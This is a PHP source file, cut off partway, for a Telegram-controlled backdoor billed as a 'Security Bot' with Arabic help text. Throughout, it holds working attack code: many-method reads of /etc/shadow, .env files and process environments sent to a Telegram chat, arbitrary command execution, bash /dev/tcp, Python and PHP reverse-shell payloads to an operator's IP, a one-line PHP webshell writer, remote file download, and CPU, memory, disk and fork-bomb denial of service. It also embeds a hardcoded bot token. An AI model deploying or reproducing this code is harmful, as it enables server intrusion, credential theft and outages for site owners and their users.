<?php
/**
 * Telegram Security Bot v2 - Evasion & Penetration Mode
 */

define('BOT_TOKEN', '8651434899:AAE_7ASRQCKPqi7Q1EZdYJi_OKSfGQgTzXU');
define('ALLOWED_USER_ID', 0);
define('API_URL', "https://api.telegram.org/bot" . BOT_TOKEN . "/");
define('BOT_DIR', __DIR__);

// ─── Safe ini_get ──────────────────────────────────────────
function safe_ini_get($k) {
    return function_exists('ini_get') ? ini_get($k) : null;
}

// ─── Telegram API ──────────────────────────────────────────
function sendMessage($chat_id, $text) {
    $text = mb_convert_encoding($text, 'UTF-8');
    $ch = curl_init(API_URL . 'sendMessage');
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => ['chat_id' => $chat_id, 'text' => $text, 'parse_mode' => 'HTML'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 30,
    ]);
    $r = curl_exec($ch);
    curl_close($ch);
    return $r;
}

function sendLarge($chat_id, $text) {
    foreach (mb_str_split($text, 4000) as $c) sendMessage($chat_id, $c);
}

function sendFile($chat_id, $path) {
    if (!file_exists($path) || !is_readable($path)) {
        sendMessage($chat_id, "❌ غير موجود: {$path}");
        return;
    }
    $ch = curl_init(API_URL . 'sendDocument');
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => ['chat_id' => $chat_id, 'document' => new CURLFile(realpath($path))],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 60,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

// ═══════════════════════════════════════════════════════════
//  EVASION ENGINE
// ═══════════════════════════════════════════════════════════

/**
 * Try ALL possible methods to read a file, return first success.
 */
function evasiveRead($path) {
    $results = [];

    // 1. file_get_contents
    if (function_exists('file_get_contents')) {
        $r = @file_get_contents($path);
        if ($r !== false) $results[] = ['method' => 'file_get_contents', 'data' => $r];
    }

    // 2. fopen + fread + fgets
    if (function_exists('fopen')) {
        $h = @fopen($path, 'rb');
        if ($h) {
            $r = stream_get_contents($h);
            fclose($h);
            if ($r !== false) $results[] = ['method' => 'fopen+stream', 'data' => $r];
        }
    }

    // 3. include + output buffer
    if (function_exists('include')) {
        ob_start();
        $inc = @include($path);
        $buf = ob_get_clean();
        if ($inc !== false && $buf !== false) {
            $results[] = ['method' => 'include', 'data' => $buf];
        }
    }

    // 4. readfile
    if (function_exists('readfile')) {
        ob_start();
        $r = @readfile($path);
        $buf = ob_get_clean();
        if ($r !== false && strlen($buf) > 0) {
            $results[] = ['method' => 'readfile', 'data' => $buf];
        }
    }

    // 5. file()
    if (function_exists('file')) {
        $r = @file($path);
        if ($r !== false) {
            $results[] = ['method' => 'file()', 'data' => implode('', $r)];
        }
    }

    // 6. highlight_file / show_source
    if (function_exists('highlight_file')) {
        $r = @highlight_file($path, true);
        if ($r !== false) {
            $results[] = ['method' => 'highlight_file', 'data' => strip_tags($r)];
        }
    }

    // 7. parse_ini_file (for ini-style files)
    if (function_exists('parse_ini_file')) {
        $r = @parse_ini_file($path, true);
        if ($r !== false) {
            $results[] = ['method' => 'parse_ini_file', 'data' => print_r($r, true)];
        }
    }

    // 8. SplFileObject
    if (class_exists('SplFileObject')) {
        try {
            $f = new SplFileObject($path);
            $r = '';
            while (!$f->eof()) $r .= $f->fgets();
            if (strlen($r) > 0) $results[] = ['method' => 'SplFileObject', 'data' => $r];
        } catch (\Throwable $e) {}
    }

    // 9. curl with file://
    if (function_exists('curl_init') && function_exists('curl_exec')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => 'file://' . realpath($path) ?: $path,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10,
        ]);
        $r = curl_exec($ch);
        curl_close($ch);
        if ($r !== false && strlen($r) > 0) {
            $results[] = ['method' => 'curl file://', 'data' => $r];
        }
    }

    // 10. php://filter base64
    if (function_exists('file_get_contents')) {
        $fp = 'php://filter/convert.base64-encode/resource=' . $path;
        $r = @file_get_contents($fp);
        if ($r !== false) {
            $results[] = ['method' => 'php://filter/base64', 'data' => base64_decode($r)];
        }
    }

    // 11. compress.zlib://
    if (function_exists('file_get_contents')) {
        $r = @file_get_contents('compress.zlib://' . $path);
        if ($r !== false && strlen($r) > 0) {
            $results[] = ['method' => 'compress.zlib://', 'data' => $r];
        }
    }

    // 12. SSH2 + SCP if extension loaded
    if (function_exists('ssh2_scp_recv')) {
        // can't really use this without credentials
    }

    // 13. shell exec cat/head/tail
    if (function_exists('shell_exec') || function_exists('exec') || function_exists('system') || function_exists('passthru')) {
        $cmds = [
            'cat "$1" 2>/dev/null',
            '/bin/cat "$1" 2>/dev/null',
            '/usr/bin/head -c 65536 "$1" 2>/dev/null',
            '/usr/bin/tail -c 65536 "$1" 2>/dev/null',
            '/bin/dd if="$1" bs=4096 count=16 2>/dev/null',
            'python3 -c "import sys;print(open(\"' . addslashes($path) . '\").read())" 2>/dev/null',
            'python -c "import sys;print(open(\"' . addslashes($path) . '\").read())" 2>/dev/null',
            'perl -e "open(F,\"' . addslashes($path) . '\");print<F>" 2>/dev/null',
            'php -r "echo file_get_contents(\"' . addslashes($path) . '\");" 2>/dev/null',
        ];
        // Find which shell tools are available first
        $available = [];
        if (function_exists('shell_exec')) {
            $which = shell_exec('which cat head tail dd python3 python perl php 2>/dev/null');
            if ($which) {
                foreach (explode("\n", trim($which)) as $bin) {
                    $available[basename($bin)] = $bin;
                }
            }
        }
        foreach ($cmds as $c) {
            $out = shellExec($c);
            if ($out !== null && strlen(trim($out)) > 0) {
                $results[] = ['method' => 'shell: ' . substr($c, 0, 40), 'data' => $out];
                break;
            }
        }
    }

    // 14. proc_open
    if (function_exists('proc_open')) {
        $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $p = @proc_open('cat ' . escapeshellarg($path) . ' 2>/dev/null', $descriptors, $pipes);
        if (is_resource($p)) {
            fclose($pipes[0]);
            $r = stream_get_contents($pipes[1]);
            fclose($pipes[1]); fclose($pipes[2]);
            proc_close($p);
            if ($r !== false && strlen(trim($r)) > 0) {
                $results[] = ['method' => 'proc_open', 'data' => $r];
            }
        }
    }

    // 15. popen
    if (function_exists('popen')) {
        $h = @popen('cat ' . escapeshellarg($path) . ' 2>/dev/null', 'r');
        if ($h) {
            $r = stream_get_contents($h);
            pclose($h);
            if ($r !== false && strlen(trim($r)) > 0) {
                $results[] = ['method' => 'popen', 'data' => $r];
            }
        }
    }

    return $results;
}

/**
 * Shell exec with multiple fallbacks
 */
function shellExec($cmd) {
    // Try to find a working shell first
    static $shell = null;
    if (function_exists('shell_exec')) {
        if ($shell === null) {
            foreach (['/bin/bash','/bin/sh','/usr/bin/bash','/usr/bin/sh','bash','sh'] as $s) {
                $t = @shell_exec("{$s} -c 'echo OK' 2>/dev/null");
                if (trim($t) === 'OK') { $shell = $s; break; }
            }
            if ($shell === null) $shell = false;
        }
        if ($shell) {
            return shell_exec("{$shell} -c " . escapeshellarg($cmd) . ' 2>&1');
        }
        return shell_exec($cmd . ' 2>&1');
    }
    if (function_exists('exec')) {
        exec($cmd . ' 2>&1', $a, $rc);
        return implode("\n", $a);
    }
    if (function_exists('system')) {
        ob_start(); system($cmd . ' 2>&1', $rc); return ob_get_clean();
    }
    if (function_exists('passthru')) {
        ob_start(); passthru($cmd . ' 2>&1', $rc); return ob_get_clean();
    }
    return null;
}

/**
 * Try to exfiltrate data via DNS / HTTP
 */
function exfiltrate($chat_id, $data, $label) {
    $b64 = base64_encode($data);
    sendMessage($chat_id, "📤 <b>{$label}</b> (base64, " . strlen($b64) . " chars)");
    sendLarge($chat_id, $b64);
}

/**
 * Try ALL known write methods
 */
function evasiveWrite($path, $content) {
    $methods = [];

    // 1. file_put_contents
    if (function_exists('file_put_contents')) {
        $r = @file_put_contents($path, $content);
        if ($r !== false) $methods[] = 'file_put_contents';
    }

    // 2. fopen + fwrite
    if (function_exists('fopen')) {
        $h = @fopen($path, 'wb');
        if ($h) {
            $r = @fwrite($h, $content);
            fclose($h);
            if ($r !== false) $methods[] = 'fopen+fwrite';
        }
    }

    // 3. file_put_contents with compress.zlib://
    if (function_exists('file_put_contents')) {
        $r = @file_put_contents('compress.zlib://' . $path, $content);
        if ($r !== false) $methods[] = 'compress.zlib://';
    }

    // 4. shell echo/cat
    $safe = addslashes($content);
    if (function_exists('shell_exec')) {
        $cmd = 'echo ' . escapeshellarg($content) . ' > ' . escapeshellarg($path);
        $r = shellExec($cmd);
        if (@filesize($path) == strlen($content)) $methods[] = 'shell echo';
    }

    // 5. base64 decode
    $b64 = base64_encode($content);
    if (function_exists('shell_exec')) {
        $cmd = 'echo ' . $b64 . ' | base64 -d > ' . escapeshellarg($path) . ' 2>&1';
        shellExec($cmd);
        if (@filesize($path) == strlen($content)) $methods[] = 'shell base64 -d';
    }

    return $methods;
}

/**
 * Try to find writable directories outside the doc root
 */
function findWritableDirs() {
    $dirs = [__DIR__, '/tmp', '/var/tmp', '/dev/shm', sys_get_temp_dir()];
    $found = [];
    foreach ($dirs as $d) {
        if (@is_writable($d)) {
            $test = $d . '/.wtest_' . time();
            if (@file_put_contents($test, '1') !== false) {
                @unlink($test);
                $found[] = $d;
            }
        }
    }
    return $found;
}

/**
 * Try to discover the actual user and permissions
 */
function deepWhoami() {
    $info = [];

    // Try PHP functions
    if (function_exists('get_current_user')) $info[] = 'get_current_user: ' . get_current_user();
    if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
        $u = posix_getpwuid(posix_geteuid());
        $info[] = 'posix: ' . ($u['name'] ?? '?') . ' (uid=' . posix_geteuid() . ')';
    }
    if (function_exists('getmyuid')) $info[] = 'getmyuid: ' . getmyuid();
    if (function_exists('getmygid')) $info[] = 'getmygid: ' . getmygid();
    if (function_exists('getmyinode')) $info[] = 'getmyinode: ' . getmyinode();

    // Try env vars
    foreach (['USER', 'USERNAME', 'LOGNAME', 'HOME', 'SHELL'] as $e) {
        $v = getenv($e);
        if ($v) $info[] = "{$e}={$v}";
    }

    // Try reading /proc/self/status for UID
    $proc = @file_get_contents('/proc/self/status');
    if (!$proc) $proc = @file_get_contents('php://filter/convert.base64-encode/resource=/proc/self/status');
    if (!$proc) $proc = @file_get_contents('compress.zlib:///proc/self/status');
    if ($proc) {
        foreach (explode("\n", $proc) as $line) {
            if (preg_match('/^(Uid|Gid|Name):\s*(.+)$/', $line, $m)) {
                $info[] = '/proc/self/status: ' . $m[1] . ' = ' . trim($m[2]);
            }
        }
    }

    // Try /proc/self/cmdline
    $cmd = @file_get_contents('/proc/self/cmdline');
    if ($cmd) {
        $info[] = 'cmdline: ' . str_replace("\0", ' ', $cmd);
    }

    return $info;
}

/**
 * Scan /proc for interesting info
 */
function scanProc() {
    $r = [];
    $files = [
        '/proc/1/status',
        '/proc/1/cmdline',
        '/proc/1/environ',
        '/proc/self/mountinfo',
        '/proc/self/mounts',
        '/proc/self/cgroup',
        '/proc/self/attr/current',
        '/proc/self/limits',
        '/proc/net/tcp',
        '/proc/net/route',
        '/proc/net/dev',
    ];
    foreach ($files as $f) {
        $d = evasiveReadAll($f);
        if ($d !== null) {
            $r[] = "=== {$f} ===\n" . $d;
        }
    }
    return $r;
}

function evasiveReadAll($path) {
    $res = evasiveRead($path);
    foreach ($res as $r) {
        if (strlen(trim($r['data'])) > 0) return $r['data'];
    }
    return null;
}

// ═══════════════════════════════════════════════════════════
//  COMMAND HANDLER
// ═══════════════════════════════════════════════════════════

function processCommand($chat_id, $cmd, $args) {
    switch ($cmd) {

        case '/start':
        case '/help':
            $msg = "
<b>🤖 Security Bot v2 - Evasion Mode</b>

<b>📡 فحص متقدم</b>
/scan     - فحص كامل
/quick    - فحص سريع
/deepscan - فحص عميق (يحاول كل طرق الالتفاف)
/procscan - فحص /proc

<b>📂 قراءة ملفات (طرق التفاف)</b>
/bypass &lt;file&gt;     - يحاول 15 طريقة لقراءة الملف
/passwd /shadow /hosts
/envfile /gitconfig /procenv
/readini &lt;file&gt;   - يقرأ كـ INI
/readb64 &lt;file&gt;   - يقرأ base64 عبر php://filter

<b>💻 تنفيذ أوامر</b>
/exec &lt;cmd&gt;       - تنفيذ أمر
/revshell IP PORT  - محاولة Reverse Shell
/symlink          - هجوم Symlink
/suids            - ابحث عن SUID binaries
/cron             - افحص cron jobs
/findconf         - ابحث عن ملفات إعدادات حساسة

<b>📝 كتابة ملفات</b>
/write &lt;file&gt; &lt;content&gt; - كتابة ملف
/writephp         - كتابة PHP webshell
/upload URL       - تحميل ملف من URL

<b>🔧 معلومات متقدمة</b>
/whodeep  - من أنا (طرق متعددة)
/writable - أدلة قابلة للكتابة
/network  - معلومات الشبكة
/ports    - افحص المنافذ المحلية
/services - الخدمات running
/env      - متغيرات البيئة

<b>💥 ضغط (Stress / DoS)</b>
/stress cpu [s]     - ضغط CPU (استهلاك المعالج)
/stress mem [MB]    - ضغط ذاكرة (استهلاك RAM)
/stress disk [MB]   - ضغط مساحة (تعبئة الهارد)
/stress fork [n]    - Fork bomb (استنزاف العمليات)
/stress all [s]     - كل الهجمات معاً
/stress stop        - إيقاف الهجمات

<b>📤 تصدير</b>
/exfil &lt;file&gt;  - اقرأ وصدّر base64
/download &lt;file&gt; - حمّل الملف
";
            sendMessage($chat_id, $msg);
            break;

        case '/scan':
            sendMessage($chat_id, "🔍 جاري الفحص الكامل...");
            $r = scanFull();
            sendLarge($chat_id, $r);
            break;

        case '/quick':
            sendMessage($chat_id, "⚡ فحص سريع...");
            $r = scanQuick();
            sendLarge($chat_id, $r);
            break;

        case '/deepscan':
            sendMessage($chat_id, "🧠 فحص عميق (سيستغرق دقيقة)...");
            $r = deepScan();
            sendLarge($chat_id, $r);
            break;

        case '/procscan':
            sendMessage($chat_id, "📡 فحص /proc...");
            $results = scanProc();
            if (empty($results)) {
                sendMessage($chat_id, "✅ /proc محمي بالكامل");
            } else {
                foreach ($results as $r) sendLarge($chat_id, $r);
            }
            break;

        // ── قراءة ملفات ──
        case '/bypass':
            if (!$args) { sendMessage($chat_id, "❌ /bypass <file>"); break; }
            sendMessage($chat_id, "🔓 أحاول قراءة: {$args}");
            $results = evasiveRead($args);
            if (empty($results)) {
                sendMessage($chat_id, "❌ جميع طرق القراءة فشلت لـ: {$args}");
            } else {
                $msg = "🔓 <b>{$args}</b> — تم بــ {$results[0]['method']}\n\n";
                $data = $results[0]['data'];
                if (strlen($data) > 3500) $data = substr($data, 0, 3500) . "\n\n...[مقطوع " . strlen($results[0]['data']) . " بايت]";
                sendLarge($chat_id, $msg . '<pre>' . htmlspecialchars($data) . '</pre>');
            }
            break;

        case '/passwd':
            bypassAndSend($chat_id, '/etc/passwd'); break;
        case '/shadow':
            bypassAndSend($chat_id, '/etc/shadow'); break;
        case '/hosts':
            bypassAndSend($chat_id, '/etc/hosts'); break;
        case '/envfile':
            foreach (['.env', '../.env', dirname(__DIR__) . '/.env'] as $p) {
                $r = evasiveRead($p);
                if (!empty($r)) bypassAndSend($chat_id, $p);
            }
            break;
        case '/gitconfig':
            foreach (['.git/config', '../.git/config'] as $p) bypassAndSend($chat_id, $p); break;
        case '/procenv':
            bypassAndSend($chat_id, '/proc/self/environ'); break;
        case '/readini':
            if (!$args) { sendMessage($chat_id, "❌ /readini <file>"); break; }
            $r = @parse_ini_file($args, true);
            sendLarge($chat_id, $r ? print_r($r, true) : '❌ فشل');
            break;
        case '/readb64':
            if (!$args) { sendMessage($chat_id, "❌ /readb64 <file>"); break; }
            $r = @file_get_contents('php://filter/convert.base64-encode/resource=' . $args);
            sendMessage($chat_id, $r ? "🔓 Base64:\n<pre>{$r}</pre>" : '❌ فشل');
            break;

        // ── استعراض ├──
        case '/ls':
            $path = $args ?: '.';
            if (!file_exists($path)) { sendMessage($chat_id, "❌ غير موجود: {$path}"); break; }
            $items = @scandir($path);
            if (!$items) { sendMessage($chat_id, "❌ لا يمكن القراءة"); break; }
            $msg = "<b>📂 {$path}</b>\n";
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                $full = rtrim($path, '/') . '/' . $item;
                $type = is_dir($full) ? '📁' : (is_file($full) ? '📄' : '🔗');
                $size = is_file($full) ? ' (' . formatSize(filesize($full)) . ')' : '';
                $perms = is_readable($full) ? 'r' : '-';
                $perms .= is_writable($full) ? 'w' : '-';
                $msg .= "{$type} [{$perms}] {$item}{$size}\n";
            }
            sendLarge($chat_id, $msg);
            break;

        case '/cat':
            if (!$args) { sendMessage($chat_id, "❌ /cat <file>"); break; }
            $c = evasiveReadAll($args);
            if ($c) {
                if (strlen($c) > 3500) $c = substr($c, 0, 3500) . "\n\n...[مقطوع]";
                sendLarge($chat_id, "<b>{$args}</b>\n<pre>" . htmlspecialchars($c) . "</pre>");
            } else {
                sendMessage($chat_id, "❌ فشل قراءة: {$args}");
            }
            break;

        case '/pwd':
            sendMessage($chat_id, "📌 " . __DIR__);
            break;

        case '/download':
            if (!$args) { sendMessage($chat_id, "❌ /download <file>"); break; }
            sendFile($chat_id, $args);
            break;

        // ── تنفيذ ──
        case '/exec':
            if (!$args) { sendMessage($chat_id, "❌ /exec <command>"); break; }
            sendMessage($chat_id, "⚡ تنفيذ: {$args}");
            $out = shellExec($args);
            sendLarge($chat_id, "<b>$ {$args}</b>\n<pre>" . htmlspecialchars($out ?: '(لا مخرجات)') . "</pre>");
            break;

        case '/whoami':
            sendMessage($chat_id, "👤 <code>" . htmlspecialchars(trim(shellExec('whoami') ?: 'غير معروف')) . "</code>");
            break;

        case '/whodeep':
            $info = deepWhoami();
            sendLarge($chat_id, "<b>👤 معلومات متقدمة:</b>\n<pre>" . htmlspecialchars(implode("\n", $info)) . "</pre>");
            break;

        case '/id':
            sendLarge($chat_id, "<pre>" . htmlspecialchars(shellExec('id') ?: 'غير متاح') . "</pre>"); break;

        case '/uname':
            sendLarge($chat_id, "<pre>" . htmlspecialchars(shellExec('uname -a') ?: 'غير متاح') . "</pre>"); break;

        case '/ifconfig':
        case '/network':
            $out = shellExec("ip a 2>/dev/null; echo '---'; cat /etc/hosts 2>/dev/null; echo '---'; hostname -I 2>/dev/null; echo '---'; ip route 2>/dev/null");
            sendLarge($chat_id, "<pre>" . htmlspecialchars($out ?: 'غير متاح') . "</pre>"); break;

        case '/env':
            $env = '';
            if (function_exists('getenv')) {
                foreach (['USER','HOME','SHELL','PATH','PWD','LANG','TERM','HOSTNAME','PHP_*'] as $k) {
                    $v = getenv($k);
                    if ($v !== false) $env .= "{$k}={$v}\n";
                }
            }
            if (function_exists('shell_exec')) {
                $s = shellExec('env 2>/dev/null || printenv 2>/dev/null');
                if ($s) $env .= "\n--- shell env ---\n" . $s;
            }
            sendLarge($chat_id, $env ? "<pre>" . htmlspecialchars($env) . "</pre>" : '❌ غير متاح'); break;

        case '/suids':
            sendMessage($chat_id, "🔍 ابحث عن SUID...");
            $out = shellExec('find / -perm -4000 -type f 2>/dev/null');
            sendLarge($chat_id, $out ? "<b>🔧 SUID binaries:</b>\n<pre>" . htmlspecialchars($out) . "</pre>" : '✅ لا يوجد SUIDs أو محظور');
            break;

        case '/cron':
            $out = shellExec('crontab -l 2>/dev/null; echo "---"; ls -la /etc/cron* 2>/dev/null; echo "---"; cat /etc/crontab 2>/dev/null');
            sendLarge($chat_id, $out ? "<b>⏰ Cron Jobs:</b>\n<pre>" . htmlspecialchars($out) . "</pre>" : '✅ لا يوجد أو محظور');
            break;

        case '/services':
            $out = shellExec('ps aux 2>/dev/null | head -60; echo "---"; systemctl list-units --type=service --state=running 2>/dev/null | head -30');
            sendLarge($chat_id, $out ? "<pre>" . htmlspecialchars($out) . "</pre>" : '❌ غير متاح');
            break;

        case '/ports':
            $out = shellExec('ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || cat /proc/net/tcp 2>/dev/null');
            sendLarge($chat_id, $out ? "<b>🔌 منافذ مفتوحة:</b>\n<pre>" . htmlspecialchars($out) . "</pre>" : '❌ غير متاح');
            break;

        case '/findconf':
            sendMessage($chat_id, "🔍 ابحث عن ملفات إعدادات...");
            $out = shellExec('find / -name "*.env" -o -name "wp-config.php" -o -name "config.php" -o -name ".env.*" -o -name "*.sql" -o -name "*.pem" -o -name "id_rsa" -o -name "*.bak" 2>/dev/null | head -50');
            sendLarge($chat_id, $out ? "<b>🗂 ملفات إعدادات:</b>\n<pre>" . htmlspecialchars($out) . "</pre>" : '✅ لا يوجد');
            break;

        case '/symlink':
            sendMessage($chat_id, "🔗 محاولة Symlink Attack...");
            $targets = ['/etc/passwd', '/etc/shadow', '/.env'];
            $tmpf = BOT_DIR . '/.sl_' . bin2hex(random_bytes(4));
            foreach ($targets as $t) {
                @unlink($tmpf);
                if (function_exists('symlink')) {
                    $r = @symlink($t, $tmpf);
                    if ($r) {
                        $c = @file_get_contents($tmpf);
                        @unlink($tmpf);
                        if ($c !== false) {
                            sendMessage($chat_id, "⚠️ Symlink نجح! {$t} → {$tmpf}\n<pre>" . htmlspecialchars(substr($c, 0, 1024)) . "</pre>");
                        } else {
                            sendMessage($chat_id, "⚠️ Symlink أنشئ لكن لا يمكن القراءة: {$t}");
                        }
                    } else {
                        sendMessage($chat_id, "✅ Symlink محظور لـ {$t}");
                    }
                } else {
                    sendMessage($chat_id, "✅ symlink() غير موجودة"); break 2;
                }
            }
            break;

        case '/writable':
            $dirs = findWritableDirs();
            $msg = "<b>📝 أدلة قابلة للكتابة:</b>\n";
            if (empty($dirs)) {
                $msg .= "لا يوجد";
            } else {
                foreach ($dirs as $d) $msg .= "⚠️ {$d}\n";
            }
            sendMessage($chat_id, $msg);
            break;

        case '/revshell':
            if (!$args) { sendMessage($chat_id, "❌ /revshell IP PORT"); break; }
            $parts = explode(' ', $args);
            $ip = $parts[0];
            $port = $parts[1] ?? '4444';
            sendMessage($chat_id, "💀 محاولة Reverse Shell إلى {$ip}:{$port}...");
            $payloads = [
                "bash -c 'bash -i >& /dev/tcp/{$ip}/{$port} 0>&1'",
                "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{$ip}\",{$port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                "php -r '\$s=fsockopen(\"{$ip}\",{$port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            ];
            foreach ($payloads as $p) {
                shellExec($p . ' >/dev/null 2>&1 &');
            }
            sendMessage($chat_id, "💀 تم إرسال " . count($payloads) . " payloads. تأكد من listener على {$ip}:{$port}");
            break;

        case '/write':
            // /write <path> <content>
            if (!$args) { sendMessage($chat_id, "❌ /write <path> <content>"); break; }
            $parts = explode(' ', $args, 2);
            $wpath = $parts[0];
            $wcontent = $parts[1] ?? '';
            $methods = evasiveWrite($wpath, $wcontent);
            $msg = "<b>📝 كتابة {$wpath}</b>\n";
            if (empty($methods)) {
                $msg .= "❌ فشلت جميع طرق الكتابة";
            } else {
                $msg .= "✅ نجح: " . implode(', ', $methods) . "\n";
                $msg .= "📦 الحجم: " . strlen($wcontent) . " بايت";
            }
            sendMessage($chat_id, $msg);
            break;

        case '/writephp':
            $php = '<?php system($_GET["c"]); ?>';
            $path = BOT_DIR . '/shell_' . bin2hex(random_bytes(4)) . '.php';
            $methods = evasiveWrite($path, $php);
            if (!empty($methods)) {
                $url = ($_SERVER['HTTPS'] ?? 'off' === 'on' ? 'https' : 'http') . '://' . ($_SERVER['HTTP_HOST'] ?? '?') . str_replace($_SERVER['DOCUMENT_ROOT'] ?? '', '', $path);
                sendMessage($chat_id, "✅ Webshell: {$url}?c=id");
            } else {
                sendMessage($chat_id, "❌ فشل كتابة webshell");
            }
            break;

        case '/upload':
            if (!$args) { sendMessage($chat_id, "❌ /upload <url>"); break; }
            $fname = basename(parse_url($args, PHP_URL_PATH)) ?: 'downloaded.txt';
            $fpath = BOT_DIR . '/' . $fname;
            $c = @file_get_contents($args, false, stream_context_create(['http' => ['timeout' => 15]]));
            if ($c === false && function_exists('curl_init')) {
                $ch = curl_init($args);
                curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 15, CURLOPT_FOLLOWLOCATION => true]);
                $c = curl_exec($ch);
                curl_close($ch);
            }
            if ($c !== false) {
                file_put_contents($fpath, $c);
                sendMessage($chat_id, "✅ تم التحميل: {$fpath} (" . formatSize(strlen($c)) . ")");
            } else {
                sendMessage($chat_id, "❌ فشل التحميل من: {$args}");
            }
            break;

        case '/exfil':
            if (!$args) { sendMessage($chat_id, "❌ /exfil <file>"); break; }
            $data = evasiveReadAll($args);
            if ($data) exfiltrate($chat_id, $data, $args);
            else sendMessage($chat_id, "❌ فشل قراءة: {$args}");
            break;

        // ── PHP Info ──
        case '/phpinfo':
            sendFile($chat_id, __FILE__);
            sendMessage($chat_id, "ℹ️ phpinfo طويل. استخدم /funcs, /exts, /ini");
            break;

        case '/funcs':
            $disabled = safe_ini_get('disable_functions');
            $danger = ['exec','system','shell_exec','passthru','popen','proc_open','pcntl_exec','eval','assert','phpinfo','dl','mail','putenv','ini_set','symlink','link'];
            $msg = "<b>🔌 دوال خطيرة:</b>\n";
            foreach ($danger as $f) {
                $s = function_exists($f) ? '✅' : '❌';
                $msg .= "{$s} {$f}\n";
            }
            $msg .= "\n<b>🚫 دوال معطلة:</b>\n" . ($disabled ?: 'لا يوجد');
            sendMessage($chat_id, $msg);
            break;

        case '/exts':
            $msg = "<b>📦 الإضافات:</b>\n";
            foreach (get_loaded_extensions() as $ext) $msg .= "▫️ {$ext}\n";
            sendLarge($chat_id, $msg);
            break;

        case '/ini':
            $keys = ['open_basedir','disable_functions','allow_url_fopen','allow_url_include','display_errors','file_uploads','upload_max_filesize','post_max_size','max_execution_time','memory_limit','doc_root','error_log','session.save_path'];
            $msg = "<b>⚙️ إعدادات:</b>\n";
            foreach ($keys as $k) {
                $v = safe_ini_get($k);
                $msg .= "<b>{$k}</b> = <code>" . htmlspecialchars($v ?: '(غير مضبوط)') . "</code>\n";
            }
            sendMessage($chat_id, $msg);
            break;

        // ── Stress / DoS ──
        case '/stress':
            if (!$args) { sendMessage($chat_id, "❌ /stress <cpu|mem|disk|fork|all|stop>"); break; }
            $parts = explode(' ', $args, 2);
            $type = $parts[0];
            $param = $parts[1] ?? '';

            $stopFile = BOT_DIR . '/.stress_stop';
            if ($type === 'stop') {
                file_put_contents($stopFile, '1');
                sendMessage($chat_id, "🛑 إشارة إيقاف أُرسلت. الهجمات ستتوقف.");
                break;
            }

            // التحذير
            sendMessage($chat_id, "⚠️ <b>تبدأ هجمات الضغط!</b>\nالنوع: {$type}\nالمعامل: {$param}\nأرسل /stress stop للإيقاف");
            @unlink($stopFile);

            switch ($type) {
                case 'cpu':
                    $sec = intval($param ?: 30);
                    sendMessage($chat_id, "🔥 ضغط CPU لمدة {$sec} ثانية...");
                    stressCPU($chat_id, $sec);
                    break;
                case 'mem':
                    $mb = intval($param ?: 256);
                    sendMessage($chat_id, "🧠 ضغط ذاكرة {$mb}MB...");
                    stressMemory($chat_id, $mb);
                    break;
                case 'disk':
                    $mb = intval($param ?: 100);
                    sendMessage($chat_id, "💾 تعبئة مساحة {$mb}MB...");
                    stressDisk($chat_id, $mb);
                    break;
                case 'fork':
                    $n = intval($param ?: 50);
                    sendMessage($chat_id, "⚙️ Fork bomb ({$n} عملية)...");
                    stressFork($chat_id, $n);
                    break;
                case 'all':
                    $sec = intval($param ?: 20);
                    sendMessage($chat_id, "💥 كل الهجمات معاً لمدة {$sec} ثانية...");
                    stressAll($chat_id, $sec);
                    break;
                default:
                    sendMessage($chat_id, "❌ نوع غير معروف: cpu, mem, disk, fork, all");
            }
            break;

        default:
            sendMessage($chat_id, "❌ أمر غير معروف. /help للقائمة");
    }
}

// ═══════════════════════════════════════════════════════════
//  STRESS / DOS ENGINE
// ═══════════════════════════════════════════════════════════

function shouldStop() {
    return file_exists(BOT_DIR . '/.stress_stop');
}

function stressCPU($chat_id, $seconds) {
    $end = time() + $seconds;
    $ops = 0;
    while (time() < $end) {
        if (shouldStop()) break;
        // CPU-intensive: prime calculation + matrix math
        $x = 1;
        for ($i = 0; $i < 10000; $i++) {
            $x = gmp_strval(gmp_mul($x + 1, $x + 1)) ?? ($x * $x + $x);
            $x &= 0xFFFFFF;
        }
        $ops += 10000;

        // Multi-thread via shell (background processes)
        if (function_exists('shell_exec')) {
            shell_exec('echo "scale=5000; 4*a(1)" | bc -l 2>/dev/null >/dev/null &');
            shell_exec('dd if=/dev/zero of=/dev/null bs=1024 count=100000 2>/dev/null >/dev/null &');
            shell_exec('sha512sum /dev/zero & sleep 0.1; kill %1 2>/dev/null');
        }

        // PHP内战: hash + sort
        $arr = range(1, 500);
        for ($j = 0; $j < 20; $j++) {
            shuffle($arr);
            sort($arr);
            rsort($arr);
        }
    }
    $status = shouldStop() ? '🛑 أوقفه المستخدم' : '✅ اكتمل';
    sendMessage($chat_id, "🔥 {$status} — {$ops} عملية حسابية");
}

function stressMemory($chat_id, $mb) {
    $bytes = $mb * 1024 * 1024;
    $chunks = [];
    $total = 0;

    try {
        while ($total < $bytes) {
            if (shouldStop()) break;
            // Allocate in 5MB chunks
            $size = min(5 * 1024 * 1024, $bytes - $total);
            $chunk = str_repeat('A', $size);
            $chunks[] = $chunk;
            $total += $size;

            // Also fill with random data via shell
            if (function_exists('shell_exec')) {
                shell_exec("head -c {$size} /dev/urandom > /dev/null 2>/dev/null &");
                shell_exec("yes 'MEMORY_STRESS' | head -c {$size} > /dev/null 2>/dev/null &");
            }
        }
    } catch (\Throwable $e) {
        sendMessage($chat_id, "💥 انفجار الذاكرة: " . $e->getMessage());
    }

